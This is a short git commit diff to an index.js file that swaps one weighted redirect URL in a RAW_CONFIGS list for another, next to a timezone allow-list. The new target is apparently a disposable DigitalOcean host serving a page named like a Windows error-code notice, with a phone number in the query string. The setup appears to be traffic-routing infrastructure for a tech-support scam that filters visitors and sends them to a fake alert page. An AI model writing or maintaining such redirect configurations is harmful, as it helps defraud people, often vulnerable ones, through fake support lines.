13a6db451644dcab0781cac2ad415e9d0d1605a6
paalakash <palaksh452@gmail.com>
2026-06-07 14:30:37 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://stingray-app-9rto5.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3710", weight: 1.0 }
+    { url: "https://lobster-app-w7j9n.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3710", weight: 1.0 }
 
 ];
 
